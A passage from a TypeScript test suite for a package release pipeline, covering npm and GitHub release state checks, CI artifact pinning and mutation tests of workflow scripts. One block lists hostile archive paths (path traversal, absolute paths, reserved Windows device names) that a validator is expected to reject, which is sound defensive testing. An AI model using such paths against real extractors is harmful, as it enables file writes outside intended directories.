        "4.0.0",
        "latest"
      )
    ).toThrow(/dist-tag/);
    expect(() =>
      evaluateNpmPublication(
        { exists: true, gitHead: TRUSTED_SOURCE_SHA, integrity: npmIntegrity, channelVersion: "4.0.0-beta.9" },
        TRUSTED_SOURCE_SHA,
        npmIntegrity,
        "4.0.0-rc.2",
        "rc"
      )
    ).toThrow(/resolves to beta/);
    expect(() =>
      evaluateNpmPublication(
        { exists: true, gitHead: TRUSTED_SOURCE_SHA, integrity: npmIntegrity, channelVersion: "4.0.0-rc.2" },
        TRUSTED_SOURCE_SHA,
        npmIntegrity,
        "4.0.0-rc.2",
        undefined
      )
    ).toThrow(/not npm channel/);
    expect(() =>
      evaluateNpmPublication(
        { exists: true, gitHead: TRUSTED_SOURCE_SHA, integrity: npmIntegrity, channelVersion: "4.0.0-rc.2" },
        TRUSTED_SOURCE_SHA,
        npmIntegrity,
        "4.0.0-rc.2",
        "beta"
      )
    ).toThrow(/not npm channel beta/);

    const releaseExpected = {
      tag: "v4.0.0-rc.2",
      prerelease: true,
      name: "v4.0.0-rc.2",
      body: "Canonical release notes",
      assetNames: ["a", "b"]
    };
    const draftRelease = {
      id: 100,
      tag_name: releaseExpected.tag,
      target_commitish: "main",
      name: releaseExpected.name,
      body: releaseExpected.body,
      prerelease: releaseExpected.prerelease,
      draft: true
    };
    const assetA = releaseAsset("a", 101);
    const assetB = releaseAsset("b", 102);
    const sixNames = ["a", "b", "c", "d", "e", "f"];
    const sixAssets = sixNames.map((name, index) => releaseAsset(name, 101 + index));
    const sixExpected = { ...releaseExpected, assetNames: sixNames };
    expect(evaluateMcpbReleaseState({ release: null, assets: [] }, releaseExpected)).toEqual({
      action: "create_draft",
      missing: ["a", "b"]
    });
    for (const malformedExpected of [
      null,
      {},
      { ...releaseExpected, tag: "" },
      { ...releaseExpected, prerelease: "true" },
      { ...releaseExpected, name: "" },
      { ...releaseExpected, body: "" },
      { ...releaseExpected, assetNames: null },
      { ...releaseExpected, assetNames: ["a", ""] },
      { ...releaseExpected, assetNames: ["a", "a"] }
    ]) {
      expect(() => evaluateMcpbReleaseState({ release: null, assets: [] }, malformedExpected)).toThrow();
    }
    expect(evaluateMcpbReleaseState({ release: draftRelease, assets: [assetA] }, releaseExpected)).toEqual({
      action: "resume_draft",
      missing: ["b"]
    });
    expect(evaluateMcpbReleaseState({ release: draftRelease, assets: [assetA, assetB] }, releaseExpected)).toEqual({
      action: "publish_draft",
      missing: []
    });
    expect(
      evaluateMcpbReleaseState(
        { release: { ...draftRelease, draft: false, immutable: true }, assets: [assetA, assetB] },
        releaseExpected
      )
    ).toEqual({ action: "reuse_published", missing: [] });
    expect(evaluateMcpbReleaseState({ release: draftRelease, assets: sixAssets }, sixExpected)).toEqual({
      action: "publish_draft",
      missing: []
    });
    expect(evaluateMcpbReleaseState({ release: draftRelease, assets: [...sixAssets].reverse() }, sixExpected)).toEqual({
      action: "publish_draft",
      missing: []
    });
    expect(() =>
      evaluateMcpbReleaseState(
        { release: { ...draftRelease, draft: false, immutable: true }, assets: [assetA] },
        releaseExpected
      )
    ).toThrow(/partial/);
    expect(() =>
      evaluateMcpbReleaseState({ release: { ...draftRelease, tag_name: "v4.0.0-rc.1" }, assets: [] }, releaseExpected)
    ).toThrow(/identity diverged/);
    expect(() =>
      evaluateMcpbReleaseState({ release: { ...draftRelease, name: "phishing title" }, assets: [] }, releaseExpected)
    ).toThrow(/metadata/);
    expect(() =>
      evaluateMcpbReleaseState({ release: { ...draftRelease, body: "stale notes" }, assets: [] }, releaseExpected)
    ).toThrow(/metadata/);
    expect(() =>
      evaluateMcpbReleaseState({ release: draftRelease, assets: [{ ...assetA, name: "unexpected" }] }, releaseExpected)
    ).toThrow(/unexpected/);
    expect(() =>
      evaluateMcpbReleaseState({ release: draftRelease, assets: [assetA, { ...assetA, id: 103 }] }, releaseExpected)
    ).toThrow(/duplicate/);
    expect(() =>
      evaluateMcpbReleaseState(
        { release: draftRelease, assets: [assetA, { ...assetB, id: assetA.id }] },
        releaseExpected
      )
    ).toThrow(/duplicate GitHub release asset id/);
    expect(() =>
      evaluateMcpbReleaseState({ release: draftRelease, assets: [{ ...assetA, state: "starter" }] }, releaseExpected)
    ).toThrow(/manual recovery/);
    for (const malformedAsset of [
      { ...assetA, state: "" },
      { ...assetA, state: null },
      { ...assetA, content_type: "text/plain" },
      { ...assetA, content_type: null },
      { ...assetA, size: 0 },
      { ...assetA, size: -1 },
      { ...assetA, size: 1.5 },
      { ...assetA, size: Number.MAX_SAFE_INTEGER + 1 },
      { ...assetA, size: "101" },
      { ...assetA, digest: null },
      { ...assetA, digest: "sha256:short" },
      { ...assetA, digest: `sha256:${"A".repeat(64)}` },
      { ...assetA, digest: `sha512-${"a".repeat(64)}` }
    ]) {
      expect(() =>
        evaluateMcpbReleaseState({ release: draftRelease, assets: [malformedAsset] }, releaseExpected)
      ).toThrow();
    }
    for (const malformedState of [
      {},
      { release: null },
      { release: null, assets: null },
      { release: null, assets: [assetA] },
      { release: undefined, assets: [] },
      { release: { ...draftRelease, id: 0 }, assets: [] },
      { release: { ...draftRelease, id: 1.5 }, assets: [] },
      { release: { ...draftRelease, id: Number.MAX_SAFE_INTEGER + 1 }, assets: [] },
      { release: { ...draftRelease, id: "100" }, assets: [] },
      { release: draftRelease, assets: [{ ...assetA, id: 0 }] },
      { release: draftRelease, assets: [{ ...assetA, id: "101" }] },
      { release: draftRelease, assets: [{ ...assetA, id: Number.MAX_SAFE_INTEGER + 1 }] }
    ]) {
      expect(() => evaluateMcpbReleaseState(malformedState, releaseExpected)).toThrow();
    }
    expect(evaluateConvergentCount(0, 1, 1, 12, "draft")).toEqual({ action: "retry", attempt: 1 });
    expect(evaluateConvergentCount(1, 1, 2, 12, "draft")).toEqual({ action: "ready", attempt: 2 });
    expect(evaluateConvergentCount(4, 6, 10, 12, "assets")).toEqual({ action: "retry", attempt: 10 });
    expect(evaluateConvergentCount(6, 6, 11, 12, "assets")).toEqual({ action: "ready", attempt: 11 });
    expect(() => evaluateConvergentCount(2, 1, 1, 12, "draft")).toThrow(/expected exactly 1/);
    expect(() => evaluateConvergentCount(5, 6, 12, 12, "assets")).toThrow(/did not converge/);
    for (const [observed, expected, attempt, maxAttempts, label] of [
      [-1, 1, 1, 12, "draft"],
      [0, 0, 1, 12, "draft"],
      [0, 1, 0, 12, "draft"],
      [0, 1, 1, 0, "draft"],
      [0, 1, 13, 12, "draft"],
      [0, 1, 1, 12, ""],
      [0.5, 1, 1, 12, "draft"],
      [0, 1.5, 1, 12, "draft"],
      [0, 1, 1.5, 12, "draft"],
      [0, 1, 1, 12.5, "draft"],
      [Number.MAX_SAFE_INTEGER + 1, 1, 1, 12, "draft"],
      [0, 1, 1, Number.MAX_SAFE_INTEGER + 1, "draft"],
      ["0", 1, 1, 12, "draft"],
      [0, 1, 1, 12, 42]
    ]) {
      expect(() => evaluateConvergentCount(observed, expected, attempt, maxAttempts, label)).toThrow(/invalid/);
    }
    const releaseCliEnv = {
      EXPECTED_RELEASE_NAME: releaseExpected.name,
      EXPECTED_RELEASE_BODY: releaseExpected.body
    };
    const releaseCli = runReleaseIntegrityCli(
      ["release-state", releaseExpected.tag, "true", "a", "b"],
      JSON.stringify({ release: draftRelease, assets: [assetA] }),
      releaseCliEnv
    );
    expect(releaseCli.status).toBe(0);
    expect(JSON.parse(releaseCli.stdout)).toEqual({ action: "resume_draft", missing: ["b"] });
    const publishedReleaseCli = runReleaseIntegrityCli(
      ["release-state", releaseExpected.tag, "false", "a", "b"],
      JSON.stringify({
        release: { ...draftRelease, prerelease: false, draft: false, immutable: true },
        assets: [assetA, assetB]
      }),
      releaseCliEnv
    );
    expect(publishedReleaseCli.status).toBe(0);
    expect(JSON.parse(publishedReleaseCli.stdout)).toEqual({ action: "reuse_published", missing: [] });
    expect(
      runReleaseIntegrityCli(
        ["release-state", releaseExpected.tag, "TRUE", "a", "b"],
        JSON.stringify({ release: draftRelease, assets: [assetA] }),
        releaseCliEnv
      ).status
    ).not.toBe(0);
    expect(
      runReleaseIntegrityCli(
        ["release-state", releaseExpected.tag, "true", "a", "b"],
        JSON.stringify({ release: draftRelease, assets: [assetA] })
      ).status
    ).not.toBe(0);
    const visibilityCli = runReleaseIntegrityCli(["visibility", "0", "1", "1", "12", "draft"]);
    expect(visibilityCli.status).toBe(0);
    expect(JSON.parse(visibilityCli.stdout)).toEqual({ action: "retry", attempt: 1 });
    const assetVisibilityRetryCli = runReleaseIntegrityCli(["visibility", "4", "6", "10", "12", "assets"]);
    expect(assetVisibilityRetryCli.status).toBe(0);
    expect(JSON.parse(assetVisibilityRetryCli.stdout)).toEqual({ action: "retry", attempt: 10 });
    const assetVisibilityReadyCli = runReleaseIntegrityCli(["visibility", "6", "6", "11", "12", "assets"]);
    expect(assetVisibilityReadyCli.status).toBe(0);
    expect(JSON.parse(assetVisibilityReadyCli.stdout)).toEqual({ action: "ready", attempt: 11 });
    for (const args of [
      ["visibility", "01", "1", "1", "12", "draft"],
      ["visibility", "0.5", "1", "1", "12", "draft"],
      ["visibility", "9007199254740992", "1", "1", "12", "draft"],
      ["visibility", "0", "1", "1", "0", "draft"],
      ["visibility", "0", "1", "1", "12"]
    ]) {
      expect(runReleaseIntegrityCli(args).status).not.toBe(0);
    }

    const candidateRun10 = { ...TRUSTED_CI_RUN, id: 10 };
    const candidateRun20 = { ...TRUSTED_CI_RUN, id: 20 };
    expect(candidateRunIds([candidateRun20, candidateRun10], TRUSTED_SOURCE_SHA)).toEqual(["10", "20"]);
    for (const malformedRun of [
      { ...candidateRun10, id: 0 },
      { ...candidateRun10, id: 1.5 },
      { ...candidateRun10, id: Number.MAX_SAFE_INTEGER + 1 },
      { ...candidateRun10, id: "10" },
      { ...candidateRun10, name: "Other" },
      { ...candidateRun10, path: ".github/workflows/other.yml" },
      { ...candidateRun10, head_sha: "f".repeat(40) }
    ]) {
      expect(() => candidateRunIds([malformedRun], TRUSTED_SOURCE_SHA)).toThrow(/trusted CI workflow run identity/);
    }
    expect(() => candidateRunIds([candidateRun10, { ...candidateRun10 }], TRUSTED_SOURCE_SHA)).toThrow(
      /duplicate candidate workflow run id/
    );
    expect(() => candidateRunIds([candidateRun10], "source")).toThrow(/source SHA/);

    const digest = `sha256:${"a".repeat(64)}`;
    const candidateWorkflowRun = { ...TRUSTED_CI_RUN, run_attempt: 2 };
    const candidateJob = (name: string, id: number, runAttempt: number, conclusion: string | null = "success") =>
      job(name, id, conclusion, "completed", runAttempt);
    const unrelatedCandidateJob = candidateJob("unrelated", 200, 1);
    const producerCandidateJob = candidateJob("mcpb-basic-package", 201, 1);
    const aggregateCandidateJob = candidateJob("mcpb-basic", 202, 2);
    const candidateArtifact = { name: "mcpb-basic-candidate-1", expired: false, id: 42, digest };
    const candidate = {
      workflowRun: candidateWorkflowRun,
      expectedSourceSha: TRUSTED_SOURCE_SHA,
      jobs: [unrelatedCandidateJob, producerCandidateJob, aggregateCandidateJob],
      artifacts: [candidateArtifact]
    };
    expect(evaluateMcpbCandidateRun(candidate)).toEqual({
      state: "selected",
      artifactId: "42",
      digest,
      runAttempt: 1
    });
    expect(
      evaluateMcpbCandidateRun({
        ...candidate,
        workflowRun: { ...candidateWorkflowRun, run_attempt: 3 },
        jobs: [...candidate.jobs, candidateJob("mcpb-basic", 203, 3, "failure")]
      })
    ).toEqual({ state: "skip" });
    expect(
      evaluateMcpbCandidateRun({
        ...candidate,
        jobs: [candidateJob("mcpb-basic-package", 204, 2), candidateJob("mcpb-basic", 205, 1)],
        artifacts: [{ name: "mcpb-basic-candidate-2", expired: false, id: 42, digest }]
      })
    ).toEqual({ state: "skip" });
    expect(() =>
      evaluateMcpbCandidateRun({
        ...candidate,
        jobs: [...candidate.jobs, candidateJob("mcpb-basic", 206, 2)]
      })
    ).toThrow(/duplicate latest-attempt/);
    expect(() =>
      evaluateMcpbCandidateRun({
        ...candidate,
        jobs: [...candidate.jobs, candidateJob("mcpb-basic-package", 207, 1)]
      })
    ).toThrow(/duplicate latest-attempt mcpb-basic-package/);
    expect(() =>
      evaluateMcpbCandidateRun({
        ...candidate,
        jobs: [...candidate.jobs, { ...aggregateCandidateJob }]
      })
    ).toThrow(/duplicate candidate CI job id/);
    expect(() =>
      evaluateMcpbCandidateRun({
        ...candidate,
        artifacts: [...candidate.artifacts, { ...candidateArtifact, id: 43 }]
      })
    ).toThrow(/duplicate live/);
    expect(() =>
      evaluateMcpbCandidateRun({
        ...candidate,
        artifacts: [...candidate.artifacts, { ...candidateArtifact, name: "other", id: candidateArtifact.id }]
      })
    ).toThrow(/duplicate Actions artifact id/);
    expect(() => evaluateMcpbCandidateRun({ ...candidate, pinnedArtifactId: "43" })).toThrow(/artifact id/);
    for (const unsafePin of ["0", "01", String(Number.MAX_SAFE_INTEGER + 1)]) {
      expect(() => evaluateMcpbCandidateRun({ ...candidate, pinnedArtifactId: unsafePin })).toThrow(/safe integer/);
    }
    expect(() => evaluateMcpbCandidateRun({ ...candidate, pinnedRunAttempt: "2" })).toThrow(/producer attempt/);
    expect(() => evaluateMcpbCandidateRun({ ...candidate, pinnedDigest: `sha256:${"b".repeat(64)}` })).toThrow(
      /artifact digest/
    );
    for (const malformedDigestPin of [false, 0, 42, "sha256:short", `sha256:${"A".repeat(64)}`]) {
      expect(() => evaluateMcpbCandidateRun({ ...candidate, pinnedDigest: malformedDigestPin })).toThrow(
        /exact lowercase SHA-256 digest/
      );
    }
    expect(() =>
      evaluateMcpbCandidateRun({ ...candidate, artifacts: [{ ...candidateArtifact, digest: "sha256:no" }] })
    ).toThrow(/invalid identity/);
    for (const foreignJob of [
      { ...candidateJob("mcpb-basic-package", 206, 1), run_id: String(TRUSTED_CI_RUN.id) },
      { ...candidateJob("mcpb-basic-package", 206, 1), run_id: TRUSTED_CI_RUN.id + 1 },
      { ...candidateJob("mcpb-basic-package", 206, 1), id: 0 },
      { ...candidateJob("mcpb-basic-package", 206, 1), head_sha: "f".repeat(40) },
      { ...candidateJob("mcpb-basic-package", 206, 1), workflow_name: "Other" },
      { ...candidateJob("mcpb-basic-package", 206, 3) }
    ]) {
      expect(() => evaluateMcpbCandidateRun({ ...candidate, jobs: [foreignJob, aggregateCandidateJob] })).toThrow(
        /candidate CI job/
      );
    }
    expect(() =>
      evaluateMcpbCandidateRun({
        ...candidate,
        jobs: [{ ...unrelatedCandidateJob, id: 0 }, producerCandidateJob, aggregateCandidateJob]
      })
    ).toThrow(/candidate CI job unrelated/);
    for (const unsafeArtifactId of [0, 1.5, Number.MAX_SAFE_INTEGER + 1, "42"]) {
      expect(() =>
        evaluateMcpbCandidateRun({
          ...candidate,
          artifacts: [{ ...candidateArtifact, id: unsafeArtifactId }]
        })
      ).toThrow(/invalid identity/);
    }
    expect(evaluateMcpbCandidateRun({ ...candidate, artifacts: [{ ...candidateArtifact, expired: true }] })).toEqual({
      state: "skip"
    });

    expect(portableArchivePath("server/dist/index.js")).toBe("server/dist/index.js");
    for (const hostile of [
      "../escape",
      "/absolute",
      "C:/drive",
      "server/name:ads",
      "server/CON.txt",
      "server/CON .txt",
      "server/COM1 .log",
      "server/CONIN$.txt",
      "server/file. ",
      "server/\u0001control",
      "server//empty"
    ]) {
      expect(() => portableArchivePath(hostile), hostile).toThrow();
    }
    expect(portableArchiveKey("SERVER/Cafe\u0301.js")).toBe(portableArchiveKey("server/CAFÉ.js"));
    expect(nativeBinaryReason("server/addon.so.1", new Uint8Array())).toMatch(/filename/);
    expect(nativeBinaryReason("server/runtime", new Uint8Array([0x7f, 0x45, 0x4c, 0x46]))).toBe("ELF");
    expect(nativeBinaryReason("server/module.bin", new Uint8Array([0x00, 0x61, 0x73, 0x6d]))).toBe("WebAssembly");
    expect(nativeBinaryReason("server/dist/index.js", new TextEncoder().encode("export {};"))).toBeNull();
    expect(
      resolveRequiredDependencyRefs(
        { name: "root", version: "1.0.0", dependencies: { present: "1.0.0" } },
        (dependency: string) => (dependency === "present" ? "pkg:npm/present@1.0.0" : null)
      )
    ).toEqual(["pkg:npm/present@1.0.0"]);
    expect(() =>
      resolveRequiredDependencyRefs({ name: "root", version: "1.0.0", dependencies: { missing: "1.0.0" } }, () => null)
    ).toThrow(/could not resolve required dependency missing/);

    const ownedScratch = createOwnedScratch();
    try {
      expect(() => removeOwnedScratch({ ...ownedScratch, ino: ownedScratch.ino + 1 })).toThrow(/identity changed/);
      expect(existsSync(ownedScratch.path)).toBe(true);
      expect(() => removeOwnedScratch({ ...ownedScratch, token: "wrong-token" })).toThrow(/ownership token changed/);
      expect(existsSync(ownedScratch.path)).toBe(true);
    } finally {
      removeOwnedScratch(ownedScratch);
    }
    expect(existsSync(ownedScratch.path)).toBe(false);

    expect(
      remoteGateScriptProblems(
        replaceExactly(packageConsumer, "Object.keys(rootPackage.optionalDependencies ?? {})", '["better-sqlite3"]'),
        protocolConformance
      )
    ).toContain("package-consumer omit lane must derive the complete optional dependency inventory");
    expect(
      remoteGateScriptProblems(
        packageConsumer,
        replaceExactly(protocolConformance, "server was not live after traversal refusal", "traversal refusal finished")
      )
    ).toContain("protocol-conformance traversal negative must distinguish refusal from crash and prove liveness");
    expect(
      remoteGateScriptProblems(
        packageConsumer,
        replaceExactly(
          protocolConformance,
          'inventory.resources.includes("obsidian://note/01_Projects/Hermes.md")',
          'inventory.resources.includes("obsidian://note/01_Projects%2FHermes.md")'
        )
      )
    ).toContain("protocol-conformance must pin slash-preserving note resource URIs on every host");
    expect(releasePollProblems(replaceExactly(workflow, "timeout-minutes: 240", "timeout-minutes: 239"))).toContain(
      "release polling must outlive the blocking package-consumer matrix and leave publication headroom"
    );
    expect(
      releasePollProblems(
        replaceExactly(
          workflow,
          "          SHA=$(git rev-parse HEAD)",
          '          node scripts/check-release-integrity.mjs assert-tag "$TAG" "$VERSION"\n' +
            "          SHA=$(git rev-parse HEAD)"
        )
      )
    ).toContain("release gate must prove main ancestry before executing repository-owned code");
    expect(
      releasePollProblems(
        replaceExactly(
          workflow,
          'echo "epoch=$((NOW + 13800))" >> "$GITHUB_OUTPUT"',
          'echo "epoch=$((NOW + 138000))" >> "$GITHUB_OUTPUT"'
        )
      )
    ).toContain("release polling must outlive the blocking package-consumer matrix and leave publication headroom");
    expect(
      releasePollProblems(
        replaceExactly(
          workflow,
          `RELEASE_JOB_DEADLINE_EPOCH: \${{ steps.deadline.outputs.epoch }}`,
          "RELEASE_JOB_DEADLINE_EPOCH: 9999999999",
          RELEASE_DEADLINE_ENV_BINDING_COUNT
        )
      )
    ).toContain("all post-gate GitHub reads must consume the global deadline without shadowing release writes");
    expect(mutationMatchCount(workflow, RAW_GH_READ_DEADLINE_GUARD)).toBe(GH_READ_GUARD_COUNT);
    expect(
      releasePollProblems(
        replaceExactly(workflow, RAW_GH_READ_DEADLINE_GUARD, MUTATED_RAW_GH_READ_DEADLINE_GUARD, GH_READ_GUARD_COUNT)
      )
    ).toContain("all post-gate GitHub reads must consume the global deadline without shadowing release writes");
    expect(
      releasePollProblems(replaceExactly(workflow, "--raw-field|--raw-field=*", "--raw-field", GH_READ_HELPER_COUNT))
    ).toContain("all post-gate GitHub reads must consume the global deadline without shadowing release writes");
    expect(
      releasePollProblems(
        replaceExactly(
          workflow,
          "\n          RUN_PAGES=$(gh_read api --paginate --slurp",
          "\n          RUN_PAGES=$(gh api --paginate --slurp"
        )
      )
    ).toContain("all post-gate GitHub reads must consume the global deadline without shadowing release writes");
    expect(
      releasePollProblems(replaceExactly(workflow, `"$GH_BIN" api --method PATCH`, `gh_read api --method PATCH`))
    ).toContain("all post-gate GitHub reads must consume the global deadline without shadowing release writes");
    expect(releasePollProblems(replaceExactly(workflow, "  actions: read", "  actions: none"))).toContain(
      "release must grant read-only Actions API access for the exact-SHA MCPB artifact"
    );
    expect(
      releasePollProblems(
        replaceExactly(
          workflow,
          "actions/runs/$WORKFLOW_RUN_ID/jobs?filter=all&per_page=100",
          "actions/runs/$WORKFLOW_RUN_ID/jobs?filter=latest&per_page=100"
        )
      )
    ).toContain("release checks must bind exact names to one exact ci.yml main-push workflow-run all-execution view");
    expect(releasePollProblems(replaceExactly(workflow, "flatten-pages release", "jq 'add // []'", 6))).toContain(
      "every paginated release read must use one strict collection decoder"
    );
    expect(releasePollProblems(replaceExactly(workflow, "--paginate --slurp", "--paginate", 19))).toContain(
      "every paginated release read must use one strict collection decoder"
    );
    expect(releasePollProblems(replaceExactly(workflow, '"$ARTIFACT_PAGES"', '"$JOB_PAGES"'))).toContain(
      "every paginated release read must use one strict collection decoder"
    );
    expect(releasePollProblems(replaceExactly(workflow, '"$RELEASE_PAGES"', '"$ASSET_PAGES"', 5))).toContain(
      "every paginated release read must use one strict collection decoder"
    );
    expect(releasePollProblems(replaceExactly(workflow, '"$CURRENT_ASSET_PAGES"', '"$ASSET_PAGES"'))).toContain(
      "every paginated release read must use one strict collection decoder"
    );
    const absenceLoop =
      "          for (( release_preflight_attempt=1; release_preflight_attempt<=12; release_preflight_attempt++ )); do";
    const absenceRefresh =
      "            if ! RELEASE_PAGES=$(gh_read api --paginate --slurp \\\n" +
      `              "repos/\${{ github.repository }}/releases?per_page=100"); then\n` +
      '              if [ "$release_preflight_attempt" -eq 12 ]; then\n' +
      '                echo "::error::GitHub release preflight remained unreadable after 12 bounded checks"\n' +
      "                exit 1\n" +
      "              fi\n" +
      '              echo "::warning::GitHub release preflight read failed (attempt $release_preflight_attempt/12); retrying in 5s"\n' +
      "              sleep 5\n" +
      "              continue\n" +
      "            fi";
    expect(
      releasePollProblems(
        replaceExactly(workflow, `${absenceLoop}\n${absenceRefresh}`, `${absenceRefresh}\n${absenceLoop}`)
      )
    ).toContain("release absence must require six successful strict zero observations before npm");
    expect(
      releasePollProblems(replaceExactly(workflow, "RELEASE_ABSENCE_OBSERVATIONS=0", "RELEASE_ABSENCE_OBSERVATIONS=5"))
    ).toContain("release absence must require six successful strict zero observations before npm");
    expect(
      releasePollProblems(
        replaceExactly(
          workflow,
          '            if [ "$RELEASE_COUNT" -eq 1 ]; then break; fi\n' +
            "            RELEASE_ABSENCE_OBSERVATIONS=$((RELEASE_ABSENCE_OBSERVATIONS + 1))",
          "            RELEASE_ABSENCE_OBSERVATIONS=$((RELEASE_ABSENCE_OBSERVATIONS + 1))"
        )
      )
    ).toContain("release absence must require six successful strict zero observations before npm");
    expect(
      releasePollProblems(
        replaceExactly(
          workflow,
          '            RELEASE_COUNT=$(printf \'%s\' "$RELEASES" | jq --arg tag "$TAG" \\\n' +
            "              '[.[] | select(.tag_name == $tag)] | length')\n" +
            '            if [ "$RELEASE_COUNT" -gt 1 ]; then\n' +
            '              echo "::error::GitHub returned duplicate draft/published releases for $TAG"',
          "            RELEASE_COUNT=0\n" +
            '            if [ "$RELEASE_COUNT" -gt 1 ]; then\n' +
            '              echo "::error::GitHub returned duplicate draft/published releases for $TAG"'
        )
      )
    ).toContain("release absence must require six successful strict zero observations before npm");
    expect(
      releasePollProblems(
        replaceExactly(
          workflow,
          '              echo "::warning::GitHub release preflight read failed (attempt $release_preflight_attempt/12); retrying in 5s"\n' +
            "              sleep 5\n" +
            "              continue",
          '              echo "::error::GitHub release preflight read failed"\n' + "              sleep 5"
        )
      )
    ).toContain("release absence must require six successful strict zero observations before npm");
    expect(
      releasePollProblems(
        replaceExactly(
          workflow,
          '[ "$RELEASE_ABSENCE_OBSERVATIONS" -eq 6 ]',
          '[ "$RELEASE_ABSENCE_OBSERVATIONS" -eq 5 ]'
        )
      )
    ).toContain("release absence must require six successful strict zero observations before npm");
    expect(
      releasePollProblems(
        replaceExactly(
          workflow,
          '[ "$RELEASE_ABSENCE_OBSERVATIONS" -ne 6 ]',
          '[ "$RELEASE_ABSENCE_OBSERVATIONS" -ne 1 ]'
        )
      )
    ).toContain("release absence must require six successful strict zero observations before npm");
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceExactly(
          mcpbInputs.release,
          "actions/runs/$CANDIDATE_RUN_ID/jobs?filter=all&per_page=100",
          "actions/runs/$CANDIDATE_RUN_ID/jobs?filter=latest&per_page=100"
        )
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        releaseTransaction: replaceAllExactly(
          mcpbInputs.releaseTransaction,
          "$MCPB_RELEASE_CHANNEL",
          "$UNPINNED_RELEASE_CHANNEL",
          5
        )
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        manifest: replaceExactly(mcpbInputs.manifest, '"name": "obsidian_stats"', '"name": "obsidian_create_note"')
      })
    ).toContain("MCPB Basic must expose exactly 13 approved read-only tools and zero prompts");
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        manifest: replaceExactly(mcpbInputs.manifest, '"--no-prompts",', '"--watch",')
      })
    ).toContain("MCPB launch args must be the exact fail-closed Basic allowlist");
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        build: replaceExactly(mcpbInputs.build, '"--omit=optional"', '"--include=optional"')
      })
    ).toContain(
      "MCPB builder must pin upstream, omit unsafe feature deps, two-pass inventory official bytes, ship transparency records, and guard owned cleanup"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        versionSync: replaceExactly(mcpbInputs.versionSync, "mcpbManifest.version = version", "void version")
      })
    ).toContain("version lifecycle must synchronize and stage all eight published version surfaces");
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        build: replaceExactly(mcpbInputs.build, "non-portable archive path", "unchecked archive path")
      })
    ).toContain(
      "MCPB builder must pin upstream, omit unsafe feature deps, two-pass inventory official bytes, ship transparency records, and guard owned cleanup"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        consumer: replaceExactly(mcpbInputs.consumer, "ownership token changed", "scratch cleanup continued")
      })
    ).toContain(
      "MCPB consumer must prove exact inventory, transparency records, resources, omitted deps, negatives, and post-refusal liveness"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        consumer: replaceExactly(
          mcpbInputs.consumer,
          '["obsidian://note/{+notePath}"]',
          '["obsidian://note/{notePath}"]'
        )
      })
    ).toContain(
      "MCPB consumer must prove exact inventory, transparency records, resources, omitted deps, negatives, and post-refusal liveness"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        consumer: replaceExactly(
          mcpbInputs.consumer,
          MCPB_HYBRID_POSITIVE_ASSERTION,
          "expected: /Projects\\/Hermes\\.md|MCPB-basic-search-target/"
        )
      })
    ).toContain(
      "MCPB consumer must prove exact inventory, transparency records, resources, omitted deps, negatives, and post-refusal liveness"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        consumer: replaceExactly(
          mcpbInputs.consumer,
          MCPB_HYBRID_NEGATIVE_ASSERTION,
          'assert.match(noMatchText, /Projects\\/Hermes\\.md/, "obsidian_search: absent-token query returned matches")'
        )
      })
    ).toContain(
      "MCPB consumer must prove exact inventory, transparency records, resources, omitted deps, negatives, and post-refusal liveness"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        consumer: replaceExactly(
          mcpbInputs.consumer,
          'manifest.user_config.vault.type, "directory"',
          'manifest.user_config.vault.type, "entry"'
        )
      })
    ).toContain(
      "MCPB consumer must prove exact inventory, transparency records, resources, omitted deps, negatives, and post-refusal liveness"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceExactly(mcpbInputs.release, 'cmp -s "$LOCAL_ASSET" "$PREFLIGHT_DIR/$NAME"', "true")
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceExactly(
          mcpbInputs.release,
          "Preflight existing GitHub release and every Basic asset before npm",
          "Preflight removed"
        )
      })
    ).toContain("release state machine must preflight all deterministic assets before npm, then draft/upload/publish");
    const releaseWithOrderSentinel = replaceExactly(
      mcpbInputs.release,
      "Prepare deterministic Basic release records",
      "__MCPB_RELEASE_ORDER_SENTINEL__"
    );
    const releaseWithSwappedPublication = replaceExactly(
      releaseWithOrderSentinel,
      "Publish with provenance or verify an exact prior publication",
      "Prepare deterministic Basic release records"
    );
    const reorderedRelease = replaceExactly(
      releaseWithSwappedPublication,
      "__MCPB_RELEASE_ORDER_SENTINEL__",
      "Publish with provenance or verify an exact prior publication"
    );
    expect(mcpbContractProblems({ ...mcpbInputs, release: reorderedRelease })).toContain(
      "release state machine must preflight all deterministic assets before npm, then draft/upload/publish"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        integrity: replaceExactly(
          mcpbInputs.integrity,
          `mcpb-basic-candidate-\${producerAttempt}`,
          "mcpb-basic-candidate-unbound"
        )
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceExactly(mcpbInputs.release, 'candidate "$SOURCE_SHA"', 'candidate "$CANDIDATE_RUN_ID"')
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceExactly(
          mcpbInputs.release,
          "{workflow_run: $workflow_run, jobs: $jobs, artifacts: $artifacts}",
          "{jobs: $jobs, artifacts: $artifacts}"
        )
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceExactly(
          mcpbInputs.release,
